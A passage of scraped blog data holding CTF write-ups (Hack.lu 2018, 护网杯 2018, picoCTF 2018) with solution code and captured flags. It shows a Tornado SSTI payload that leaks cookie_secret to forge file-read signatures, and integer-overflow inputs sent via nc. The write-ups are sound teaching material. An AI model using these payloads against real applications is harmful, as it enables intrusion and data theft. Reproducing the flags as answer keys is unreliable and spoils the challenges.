require_once(\u0026#39;flag.php\u0026#39;); error_reporting(0); if(!isset($_GET[\u0026#39;msg\u0026#39;])){ highlight_file(__FILE__); die(); } @$msg = $_GET[\u0026#39;msg\u0026#39;]; if(@file_get_contents($msg)!==\u0026#34;Hello Challenge!","title":"Hack.lu CTF 2018 Baby PHP"},{"content":" FEZ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import os def xor(a,b): assert len(a)==len(b) c=\u0026#34;\u0026#34; for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return c def f(x,k): return xor(xor(x,k),7) def round(M,K): L=M[0:27] R=M[27:54] new_l=R new_r=xor(xor(R,L),K) return new_l+new_r def fez(m,K): for i in K: m=round(m,i) return m K=[] for i in range(7): K.append(os.urandom(27)) m=open(\u0026#34;flag\u0026#34;,\u0026#34;rb\u0026#34;).read() assert len(m)\u0026lt;54 m+=os.urandom(54-len(m)) test=os.urandom(54) print test.encode(\u0026#34;hex\u0026#34;) print fez(test,K).encode(\u0026#34;hex\u0026#34;) print fez(m,K).encode(\u0026#34;hex\u0026#34;) 假设最后一轮结束后高低字节分别为l,r，可逐轮逆推出上一轮的值，从而得到明文和密文的关系。由已知的一组test明文密文对，可得到flag的明文。\nround left right 0 l^r^k[0]^k[1]^k[3]^k[4]^k[6] l^k[1]^k[2]^k[4]^k[5] 1 l^k[1]^k[2]^k[4]^k[5] r^k[2]^k[3]^k[5]^k[6] 2 r^k[2]^k[3]^k[5]^k[6] l^r*k[3]^k[4]^k[6] 3 l^r*k[3]^k[4]^k[6] l^k[4]^k[5] 4 l^k[4]^k[5] r^k[5]^k[6] 5 r^k[5]^k[6] r^l^k[6] 6 r^l^k[6] l 7 l r 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # -*- coding: utf-8 -*- # __author__ = findneo def xor(a,b): assert len(a)==len(b) c=\u0026#34;\u0026#34; for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return c all_xor = lambda x:reduce(xor,x) test_plain=\u0026#34;c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5\u0026#34; test_cipher=\u0026#34;5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81\u0026#34; flag_cipher=\u0026#34;519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76\u0026#34; p=test_plain.decode(\u0026#34;hex\u0026#34;) c=test_cipher.decode(\u0026#34;hex\u0026#34;) f=flag_cipher.decode(\u0026#34;hex\u0026#34;) l,r=c[0:27],c[27:54] pl,pr=p[0:27],p[27:54] fl,fr=f[0:27],f[27:54] fcl=all_xor([l,r,pl,fl,fr]) fcr=all_xor([l,pr,fl]) flag=fcl+fcr print flag #flag{festel_weak_666_plo88112tty} LTSHOP 使用burp的intruder竞争买大辣条，得到超过五个大辣条。\n然后买 2**64/5+1 个辣条王，使得需要付的大辣条多到uint装不下，向上溢出为负数，我们就买得起很多的辣条王了，实现一夜暴富。\n然后flag就随便买了。\neasy_tornado 有三个提示：\n1 2 3 4 http://49.4.78.9:31465/file?filename=flag.txt\u0026amp;signature=95660d430a8ad05fc7337d12e6a08b1a render() md5(cookie_secret + md5(filename)) /fllllllllllag 报错页面存在SSTI。\n1 2 3 访问 `http://49.4.78.9:31465/error?msg={{handler.settings}}`得到配置信息。 Whoops, looks like somethings went wrong . {\u0026#39;login_url\u0026#39;: \u0026#39;/login\u0026#39;, \u0026#39;template_path\u0026#39;: \u0026#39;templates\u0026#39;, \u0026#39;xsrf_cookies\u0026#39;: True, \u0026#39;cookie_secret\u0026#39;: \u0026#39;pGD*~9Y]N?\u0026gt;5zBvS_3768U+O}\u0026lt;#^k@oM$grqZQ4!yK1ucVnijmRJlFwI%hP(0exE\u0026#39;, \u0026#39;debug\u0026#39;: False, \u0026#39;file_path\u0026#39;: \u0026#39;/www/static/files\u0026#39;, \u0026#39;static_path\u0026#39;: \u0026#39;static\u0026#39;} 得到cookie_secret，即可构造签名读取flag。\n1 2 abc@xyz:~$ curl \u0026#34;http://49.4.78.9:31465/file?filename=/fllllllllllag\u0026amp;signature=8f270fa794962fa2ec4e63e6b03a830b\u0026#34; -s | grep flag flag{59a95928373bfa789e06635d2d5e9459} 参考：https://www.cnblogs.com/bwangel23/p/4858870.html\n更多题解 护网杯2018线上赛 Writeup by Whitzard 2018护网杯线上赛 Writeup by 天枢 2018护网杯线上赛题解by Lilac 护网杯-easy laravel-Writeup 2018护网杯-web-writeup ","permalink":"https://ret2neo.cn/post/181013-huwangbei-writeup/","summary":"FEZ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import os def xor(a,b): assert len(a)==len(b) c=\u0026#34;\u0026#34; for i in range(len(a)): c+=chr(ord(a[i])^ord(b[i])) return c def f(x,k): return xor(xor(x,k),7) def round(M,K): L=M[0:27] R=M[27:54] new_l=R new_r=xor(xor(R,L),K) return new_l+new_r def fez(m,K): for i in K: m=round(m,i) return m K=[] for i in range(7): K.","title":"护网杯解题记录"},{"content":" 题目：\nhttps://2018game.picoctf.com/problems 备用：https://findneo.github.io/p/picoCTF-2018-Problems.html 附件：https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf Forensics Forensics Warmup 1 picoCTF{welcome_to_forensics}\nForensics Warmup 2 picoCTF{extensions_are_a_lie}\nDesrouleaux 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 nc 2018shell2.picoctf.com 63299 You\u0026#39;ll need to consult the file `incidents.json` to answer the following questions. What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones. 250.226.237.236 Correct! How many unique destination IP addresses were targeted by the source IP address 193.1.59.100? 2 Correct! What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places. 1.43 Correct! Great job. You\u0026#39;ve earned the flag: picoCTF{J4y_s0n_d3rUUUULo_23fa6fa6} /*精确到小数点后两位 (1+1+2+1+3+1+1)/7=1.43 import json j=json.load(open(\u0026#39;incidents.json\u0026#39;)) tickets=j[\u0026#39;tickets\u0026#39;] hashes=dict() for t in tickets: if t[\u0026#39;file_hash\u0026#39;] not in hashes.keys(): hashes[t[\u0026#39;file_hash\u0026#39;]]=[t[\u0026#39;dst_ip\u0026#39;]] else: hashes[t[\u0026#39;file_hash\u0026#39;]].append(t[\u0026#39;dst_ip\u0026#39;]) print hashes # { # u\u0026#39;78d8572c143fb161\u0026#39;: [u\u0026#39;90.174.224.210\u0026#39;], # u\u0026#39;a275ec611d018a67\u0026#39;: [u\u0026#39;94.165.167.88\u0026#39;], # u\u0026#39;308f80097c708e3d\u0026#39;: [u\u0026#39;90.174.224.210\u0026#39;, u\u0026#39;216.243.24.241\u0026#39;], # u\u0026#39;27d9b03884d73aaa\u0026#39;: [u\u0026#39;94.165.167.88\u0026#39;], # u\u0026#39;23420f902d5382e1\u0026#39;: [u\u0026#39;94.165.167.88\u0026#39;, u\u0026#39;16.139.98.188\u0026#39;, u\u0026#39;46.11.226.205\u0026#39;], # u\u0026#39;ea45791ce3528103\u0026#39;: [u\u0026#39;127.19.170.162\u0026#39;], # u\u0026#39;729b56eab8ac3252\u0026#39;: [u\u0026#39;94.165.167.88\u0026#39;]} */ Reading Between the Eyes picoCTF{r34d1ng_b37w33n_7h3_by73s}\nRecovering From the Snap 1 2 3 4 5 6 7 8 9 root@kali:~/桌面/picoctf# file animals.dd animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID \u0026#34;mkfs.fat\u0026#34;, sectors/cluster 4, root entries 512, sectors 20480 (volumes \u0026lt;=32 MB), Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT (16 bit) root@kali:~/桌面/picoctf# fdisk -lu animals.dd Disk animals.dd: 10 MiB, 10485760 bytes, 20480 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0x00000000 参考 这里 ，使用OSFMount 挂载磁盘，使用 TestDisk \u0026amp; PhotoRec 7.1-WIP, Data Recovery 恢复被删除的theflag.jpg 。\npicoCTF{th3_5n4p_happ3n3d}\nadmin panel 用wireshark打开，导出HTTP对象，其中一个文件内容是user=admin\u0026amp;password=picoCTF{n0ts3cur3_df598569} 。\nhex editor 1 2 strings hex_editor.jpg | grep pico Your flag is: \u0026#34;picoCTF{and_thats_how_u_edit_hex_kittos_8BcA67a2}\u0026#34; Truly an Artist 1 2 strings 2018.png | grep pico picoCTF{look_in_image_9f5be995} now you don\u0026rsquo;t picoCTF{n0w_y0u_533_m3}\nExt Super Magic 根据提示使用debugfs查看img文件，发现幻数损坏。\n1 2 3 4 # debugfs ext.img debugfs 1.44.4 (18-Aug-2018) debugfs: Bad magic number in super-block while trying to open ext.img ....... 从文档（https://wiki.osdev.org/Ext2#Superblock）可以看到使用ext2文件系统的第一步是寻找、提取、解析superblock。superblock总是从卷的1024字节开始，长度为1024字节。也就是说，如果一个扇区是512字节，那么superblock位于第2、3扇区。而在superblock中，ext2文件的signature（0xef53）位于第56、57两个字节，所以我们要修正文件的magic number为正确的signature，也就是修改(1024+56,1024+57)bytes即(1080,1081)bytes即(0x438,0x439)bytes的值为0xef53 。需注意采用小端序，低字节在低地址。\n根据文档修改superblock，然后可以mount到系统，发现有个flag图片。\n1 2 3 4 5 6 7 8 9 10 # file fix.img fix.img: Linux rev 1.0 ext2 filesystem data, UUID=a3708ef2-5ec0-4463-9a03-599c890645cd (large files) # xxd ext.img \u0026gt; ext.hex # xxd fix.img \u0026gt; fix.hex # diff *.hex 68c68 \u0026lt; 00000430: 34dc ad5b 0100 ffff 0000 0100 0100 0000 4..[............ --- \u0026gt; 00000430: 34dc ad5b 0100 ffff 53ef 0100 0100 0000 4..[....S....... # mkdir tmpdir \u0026amp;\u0026amp; mount fix.img tmpdir \u0026amp;\u0026amp; ll tmpdir/ | grep flag 尝试了多个命令行OCR工具，tesseract-ocr效果最好，但识别结果还需要修正。\n1 2 3 4 5 6 $apt install gocr $apt install cuneiform $apt install tesseract-ocr $tesseract cut_flag.jpg res \u0026amp;\u0026amp; cat res.txt Tesseract Open Source OCR Engine v4.0.0-rc4 with Leptonica Your flag is: \u0026#34;picoCTF {FDBfbc6141e7F 4bscI90CIaE7SbI63aEf} \u0026#34; 最后结果：picoCTF{FDBfbC6141e7F4b8c90C9aE78b963aEf}\nLying Out 根据日常流量图判断流量可能异常的时间点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 from pwn import * log=[ 10900,10800,10850,11000,10800,10750,10800,10850, 10900,11000,10800,10800,11000,10900,10700,10850, 10800,10850,11000,11050,10650,10800,10700,11000, 10900,10950,10950,10800,11000,11100,11900,13400, 13800,13400,12000,11000,10800,10800,10700,10800, 10800,11000,10900,11050,11800,13100,14600,16100, 16600,16400,14400,12800,11800,11000,10950,10800, 10800,10800,10800,10800,10900,10850,10850,10800, 10800,11000,11000,11000,11400,11900,13000,14000, 14800,15800,16200,15800,14700,13700,12200,12100, 11100,11000,10900,10800,10700,11000,11000,10800, 10900,10700,10900,10800,10750,10950,10900,10800 ] r=remote(\u0026#39;2018shell2.picoctf.com\u0026#39;,39410) prompt=r.recvuntil(\u0026#39;num_IPs\u0026#39;) data=r.recv() nums=data.split() print prompt,\u0026#39;\\n\u0026#39;,nums group=len(nums)/4 res=[] for i in range(group): t=nums[i*4+2].split(\u0026#39;:\u0026#39;) tt=int(t[0])*4+int(t[1])/15 if int(nums[i*4+3])\u0026gt;log[tt]: res.append(nums[i*4]) r.sendline(\u0026#39; \u0026#39;.join(res)) print \u0026#39; \u0026#39;.join(res),r.recv() r.close() # [x] Opening connection to 2018shell2.picoctf.com on port 39410 # [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204 # [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done # You\u0026#39;ll need to consult the file `traffic.png` to answer the following questions. # Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7. # log_ID time num_IPs # [\u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;01:00:00\u0026#39;, \u0026#39;11637\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;1\u0026#39;, \u0026#39;01:30:00\u0026#39;, \u0026#39;11640\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;02:45:00\u0026#39;, \u0026#39;11616\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;3\u0026#39;, \u0026#39;10:45:00\u0026#39;, \u0026#39;9962\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;4\u0026#39;, \u0026#39;10:45:00\u0026#39;, \u0026#39;10409\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;5\u0026#39;, \u0026#39;11:45:00\u0026#39;, \u0026#39;12732\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;14:15:00\u0026#39;, \u0026#39;10538\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;7\u0026#39;, \u0026#39;16:15:00\u0026#39;, \u0026#39;10233\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;8\u0026#39;, \u0026#39;17:30:00\u0026#39;, \u0026#39;10839\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;9\u0026#39;, \u0026#39;20:15:00\u0026#39;, \u0026#39;11936\u0026#39;, \u0026#39;10\u0026#39;, \u0026#39;10\u0026#39;, \u0026#39;20:30:00\u0026#39;, \u0026#39;9898\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;21:45:00\u0026#39;, \u0026#39;9653\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;12\u0026#39;, \u0026#39;22:30:00\u0026#39;, \u0026#39;10252\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;23:15:00\u0026#39;, \u0026#39;9619\u0026#39;] # 0 1 2 9 Correct! # Great job. You\u0026#39;ve earned the flag: picoCTF{w4y_0ut_940df760} # [*] Closed connection to 2018shell2.picoctf.com port 39410 # [Finished in 3.6s] What\u0026rsquo;s My Name? picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}\nMalware Shops 附件貌似有问题，爆破出第一个答案是5，第二个随手交一下flag就出来了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 $ nc 2018shell2.picoctf.com 57920 You\u0026#39;ll need to consult the file `clusters.png` to answer the following questions. How many attackers created the malware in this dataset? 5 Correct! In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file\u0026#39;s hash. hash jmp_count add_count 0 87847bfc 32.0 29.0 1 7eeed4b3 34.0 34.0 2 ad5e4ce0 21.0 64.0 3 628e79cf 14.0 26.0 4 b5e53809 11.0 35.0 5 ebaf5ccd 15.0 13.0 6 94ad3582 37.0 10.0 7 42f1d364 23.0 68.0 8 93827b93 11.0 38.0 9 c08300fe 41.0 10.0 7eeed4b3 Correct! Great job. You\u0026#39;ve earned the flag: picoCTF{w4y_0ut_0915ebc6} LoadSomeBits 最低有效位隐写，需要fuzz起始偏移。\n1 2 3 4 5 6 7 8 9 10 11 12 # cat lsb.py import binascii lsb=\u0026#39;\u0026#39;.join(map(lambda x:str(ord(x)\u0026amp;1),open(\u0026#39;pico2018-special-logo.bmp\u0026#39;,\u0026#39;rb\u0026#39;).read())) for offset in range(16): tmp=lsb[offset:] tmps=\u0026#39;\u0026#39;.join(chr(int(tmp[i:i+8],2)) for i in range(0,len(tmp),8)) if \u0026#39;pico\u0026#39; in tmps: print tmps break # python lsb.py | strings | grep -o picoCTF{.*} picoCTF{st0r3d_iN_tH3_l345t_s1gn1f1c4nT_b1t5_2903593693} core core file或者core dunp是一个保存进程运行时内存镜像和进程状态（如寄存器的值等）的文件。没挂调试器的程序崩溃时一般会自动产生core文件用于post-mortem debugging。可以使用 gdb program [core dump] 开始调试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 (gdb) disas main Dump of assembler code for function main: 0x080487ec \u0026lt;+0\u0026gt;: lea ecx,[esp+0x4] 0x080487f0 \u0026lt;+4\u0026gt;: and esp,0xfffffff0 0x080487f3 \u0026lt;+7\u0026gt;: push DWORD PTR [ecx-0x4] 0x080487f6 \u0026lt;+10\u0026gt;: push ebp 0x080487f7 \u0026lt;+11\u0026gt;: mov ebp,esp 0x080487f9 \u0026lt;+13\u0026gt;: push ecx 0x080487fa \u0026lt;+14\u0026gt;: sub esp,0x4 0x080487fd \u0026lt;+17\u0026gt;: call 0x80485bb \u0026lt;load_strings\u0026gt; 0x08048802 \u0026lt;+22\u0026gt;: call 0x80487c1 \u0026lt;print_flag\u0026gt; 0x08048807 \u0026lt;+27\u0026gt;: mov eax,0x0 0x0804880c \u0026lt;+32\u0026gt;: add esp,0x4 0x0804880f \u0026lt;+35\u0026gt;: pop ecx 0x08048810 \u0026lt;+36\u0026gt;: pop ebp 0x08048811 \u0026lt;+37\u0026gt;: lea esp,[ecx-0x4] 0x08048814 \u0026lt;+40\u0026gt;: ret End of assembler dump. (gdb) disas print_flag Dump of assembler code for function print_flag: =\u0026gt; 0x080487c1 \u0026lt;+0\u0026gt;: push ebp 0x080487c2 \u0026lt;+1\u0026gt;: mov ebp,esp 0x080487c4 \u0026lt;+3\u0026gt;: sub esp,0x18 0x080487c7 \u0026lt;+6\u0026gt;: mov DWORD PTR [ebp-0xc],0x539 0x080487ce \u0026lt;+13\u0026gt;: mov eax,DWORD PTR [ebp-0xc] 0x080487d1 \u0026lt;+16\u0026gt;: mov eax,DWORD PTR [eax*4+0x804a080] 0x080487d8 \u0026lt;+23\u0026gt;: sub esp,0x8 0x080487db \u0026lt;+26\u0026gt;: push eax ;flag字符串的地址保存在eax中 0x080487dc \u0026lt;+27\u0026gt;: push 0x804894c 0x080487e1 \u0026lt;+32\u0026gt;: call 0x8048410 \u0026lt;printf@plt\u0026gt; 0x080487e6 \u0026lt;+37\u0026gt;: add esp,0x10 0x080487e9 \u0026lt;+40\u0026gt;: nop 0x080487ea \u0026lt;+41\u0026gt;: leave 0x080487eb \u0026lt;+42\u0026gt;: ret End of assembler dump. (gdb) x/sb *(0x804a080+4*0x539) 0x80610f0: \u0026#34;c96bd0fa2da5c0853cf12c4f93fce288\u0026#34;s picoCTF{c96bd0fa2da5c0853cf12c4f93fce288}每个人的答案是不同的。\nGeneral Skills absolutely relative 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #define yes_len 3 const char *yes = \u0026#34;yes\u0026#34;; int main() { char flag[99]; char permission[10]; int i; FILE * file; file = fopen(\u0026#34;/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt\u0026#34; , \u0026#34;r\u0026#34;); if (file) { while (fscanf(file, \u0026#34;%s\u0026#34;, flag)!=EOF) fclose(file); } file = fopen( \u0026#34;./permission.txt\u0026#34; , \u0026#34;r\u0026#34;); if (file) { for (i = 0; i \u0026lt; 5; i++){ fscanf(file, \u0026#34;%s\u0026#34;, permission); } permission[5] = \u0026#39;\\0\u0026#39;; fclose(file); } if (!strncmp(permission, yes, yes_len)) { printf(\u0026#34;You have the write permissions.\\n%s\\n\u0026#34;, flag); } else { printf(\u0026#34;You do not have sufficient permissions to view the flag.\\n\u0026#34;); } return 0; } picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}\nAca-Shell-A 1 picoCTF{CrUsHeD_It_17ab99f5} in out error 1 2 echo \u0026#34;Please may I have the flag?\u0026#34; | ./in-out-error \u0026gt; ~/result.txt #picoCTF{p1p1ng_1S_4_7h1ng_f37fb67e} learn gdb picoCTF{gDb_iS_sUp3r_u53fuL_f3f39814}\nstore 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 root@kali:~# curl https://2018shell2.picoctf.com/static/655fb38d2f256165a0163d4a606f998a/source.c #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int con; con = 0; int account_balance = 1100; while(con == 0){ printf(\u0026#34;Welcome to the Store App V1.0\\n\u0026#34;); printf(\u0026#34;World\u0026#39;s Most Secure Purchasing App\\n\u0026#34;); printf(\u0026#34;\\n[1] Check Account Balance\\n\u0026#34;); printf(\u0026#34;\\n[2] Buy Stuff\\n\u0026#34;); printf(\u0026#34;\\n[3] Exit\\n\u0026#34;); int menu; printf(\u0026#34;\\n Enter a menu selection\\n\u0026#34;); fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;menu); if(menu == 1){ printf(\u0026#34;\\n\\n\\n Balance: %d \\n\\n\\n\u0026#34;, account_balance); } else if(menu == 2){ printf(\u0026#34;Current Auctions\\n\u0026#34;); printf(\u0026#34;[1] I Can\u0026#39;t Believe its not a Flag!\\n\u0026#34;); printf(\u0026#34;[2] Real Flag\\n\u0026#34;); int auction_choice; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;auction_choice); if(auction_choice == 1){ printf(\u0026#34;Imitation Flags cost 1000 each, how many would you like?\\n\u0026#34;); int number_flags = 0; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;number_flags); if(number_flags \u0026gt; 0){ int total_cost = 0; total_cost = 1000*number_flags; printf(\u0026#34;\\nYour total cost is: %d\\n\u0026#34;, total_cost); if(total_cost \u0026lt;= account_balance){ account_balance = account_balance - total_cost; printf(\u0026#34;\\nYour new balance: %d\\n\\n\u0026#34;, account_balance); } else{ printf(\u0026#34;Not enough funds\\n\u0026#34;); } } } else if(auction_choice == 2){ printf(\u0026#34;A genuine Flag costs 100000 dollars, and we only have 1 in stock\\n\u0026#34;); printf(\u0026#34;Enter 1 to purchase\u0026#34;); int bid = 0; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;bid); if(bid == 1){ if(account_balance \u0026gt; 100000){ printf(\u0026#34;YOUR FLAG IS:\\n\u0026#34;); } else{ printf(\u0026#34;\\nNot enough funds for transaction\\n\\n\\n\u0026#34;); }} } } else{ con = 1; } } return 0; } 整数溢出。\n1 2 python -c \u0026#39;print \u0026#34;2\\n1\\n\u0026#34;+str(((1100-100001)+2**32)/1000)+\u0026#34;\\n2\\n2\\n1\\n3\\n\u0026#34;\u0026#39; | nc 2018shell2.picoctf.com 43581 | grep pico # Enter 1 to purchaseYOUR FLAG IS: picoCTF{numb3r3_4r3nt_s4f3_6bd13a8c} rouletteinclude \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #define MAX_NUM_LEN 12 #define HOTSTREAK 3 #define MAX_WINS 16 #define ONE_BILLION 1000000000 #define ROULETTE_SIZE 36 #define ROULETTE_SPINS 128 #define ROULETTE_SLOWS 16 #define NUM_WIN_MSGS 10 #define NUM_LOSE_MSGS 5 long cash = 0; long wins = 0; //判断字符是否是数字,是则返回真。 int is_digit(char c) { return \u0026#39;0\u0026#39; \u0026lt;= c \u0026amp;\u0026amp; c \u0026lt;= \u0026#39;9\u0026#39;; } //从stdin获取一个长整型正数，最大为LONG_MAX，以换行结尾。 long get_long() { printf(\u0026#34;\u0026gt; \u0026#34;); uint64_t l = 0; char c = 0; while(!is_digit(c)) c = getchar(); while(is_digit(c)) { if(l \u0026gt;= LONG_MAX) { l = LONG_MAX; break; } l *= 10; l += c - \u0026#39;0\u0026#39;; c = getchar(); } while(c != \u0026#39;\\n\u0026#39;) c = getchar(); return l; } //随机返回一个小于5000的正整数 long get_rand() { long seed; FILE *f = fopen(\u0026#34;/dev/urandom\u0026#34;, \u0026#34;r\u0026#34;); fread(\u0026amp;seed, sizeof(seed), 1, f); fclose(f); seed = seed % 5000; if (seed \u0026lt; 0) seed = seed * -1; srand(seed); return seed; } //打印当前资金和获胜次数，下注。（输入点一） long get_bet() { while(1) { puts(\u0026#34;How much will you wager?\u0026#34;); printf(\u0026#34;Current Balance: $%lu \\t Current Wins: %lu\\n\u0026#34;, cash, wins); long bet = get_long(); if(bet \u0026lt;= cash) { return bet; } else { puts(\u0026#34;You can\u0026#39;t bet more than you have!\u0026#34;); } } } //选择下注目标1~36.（输入点二） long get_choice() { while (1) { printf(\u0026#34;Choose a number (1-%d)\\n\u0026#34;, ROULETTE_SIZE); long choice = get_long(); if (1 \u0026lt;= choice \u0026amp;\u0026amp; choice \u0026lt;= ROULETTE_SIZE) { return choice; } else { puts(\u0026#34;Please enter a valid choice.\u0026#34;); } } } //打印flag int print_flag() { char flag[48]; FILE *file; file = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); if (file == NULL) { printf(\u0026#34;Failed to open the flag file\\n\u0026#34;); return -1; } fgets(flag, sizeof(flag), file); printf(\u0026#34;%s\u0026#34;, flag); return 0; } //一些输赢后的提示语 const char *win_msgs[NUM_WIN_MSGS] = { \u0026#34;Wow.. Nice One!\u0026#34;, \u0026#34;You chose correct!\u0026#34;, \u0026#34;Winner!\u0026#34;, \u0026#34;Wow, you won!\u0026#34;, \u0026#34;Alright, now you\u0026#39;re cooking!\u0026#34;, \u0026#34;Darn.. Here you go\u0026#34;, \u0026#34;Darn, you got it right.\u0026#34;, \u0026#34;You.. win.. this round...\u0026#34;, \u0026#34;Congrats!\u0026#34;, \u0026#34;You\u0026#39;re not cheating are you?\u0026#34;, }; const char *lose_msgs1[NUM_LOSE_MSGS] = { \u0026#34;WRONG\u0026#34;, \u0026#34;Nice try..\u0026#34;, \u0026#34;YOU LOSE\u0026#34;, \u0026#34;Not this time..\u0026#34;, \u0026#34;Better luck next time...\u0026#34; }; const char *lose_msgs2[NUM_LOSE_MSGS] = { \u0026#34;Just give up!\u0026#34;, \u0026#34;It\u0026#39;s over for you.\u0026#34;, \u0026#34;Stop wasting your time.\u0026#34;, \u0026#34;You\u0026#39;re never gonna win\u0026#34;, \u0026#34;If you keep it up, maybe you\u0026#39;ll get the flag in 100000000000 years\u0026#34; }; //模拟转盘效果 void spin_roulette(long spin) { int n; puts(\u0026#34;\u0026#34;); printf(\u0026#34;Roulette : \u0026#34;); int i, j; int s = 12500; for (i = 0; i \u0026lt; ROULETTE_SPINS; i++) { n = printf(\u0026#34;%d\u0026#34;, (i%ROULETTE_SIZE)+1); usleep(s); for (j = 0; j \u0026lt; n; j++) { printf(\u0026#34;\\b \\b\u0026#34;); } } for (i = ROULETTE_SPINS; i \u0026lt; (ROULETTE_SPINS+ROULETTE_SIZE); i++) { n = printf(\u0026#34;%d\u0026#34;, (i%ROULETTE_SIZE)+1); if (((i%ROULETTE_SIZE)+1) == spin) { for (j = 0; j \u0026lt; n; j++) { printf(\u0026#34;\\b \\b\u0026#34;); } break; } usleep(s); for (j = 0; j \u0026lt; n; j++) { printf(\u0026#34;\\b \\b\u0026#34;); } } for (int k = 0; k \u0026lt; ROULETTE_SIZE; k++) { n = printf(\u0026#34;%d\u0026#34;, ((i+k)%ROULETTE_SIZE)+1); s = 1.1*s; usleep(s); for (j = 0; j \u0026lt; n; j++) { printf(\u0026#34;\\b \\b\u0026#34;); } } printf(\u0026#34;%ld\u0026#34;, spin); usleep(s); puts(\u0026#34;\u0026#34;); puts(\u0026#34;\u0026#34;); } //生成一个随机数，如果和choice一样，就给cash加双倍bet。 void play_roulette(long choice, long bet) { printf(\u0026#34;Spinning the Roulette for a chance to win $%lu!\\n\u0026#34;, 2*bet); long spin = (rand() % ROULETTE_SIZE)+1; spin_roulette(spin); if (spin == choice) { cash += 2*bet; puts(win_msgs[rand()%NUM_WIN_MSGS]); wins += 1; } else { puts(lose_msgs1[rand()%NUM_LOSE_MSGS]); puts(lose_msgs2[rand()%NUM_LOSE_MSGS]); } puts(\u0026#34;\u0026#34;); } //获得一笔随机数额的小于5000的初始资金；下注直到cash大于ONE_BILLION(1000000000)且wins大等于HOTSTREAK(3)小于MAX_WINS(16)获得flag。 int main(int argc, char *argv[]) { setvbuf(stdout, NULL, _IONBF, 0); cash = get_rand(); puts(\u0026#34;Welcome to ONLINE ROULETTE!\u0026#34;); printf(\u0026#34;Here, have $%ld to start on the house! You\u0026#39;ll lose it all anyways \u0026gt;:)\\n\u0026#34;, cash); puts(\u0026#34;\u0026#34;); long bet; long choice; while(cash \u0026gt; 0) { bet = get_bet(); cash -= bet; choice = get_choice(); puts(\u0026#34;\u0026#34;); 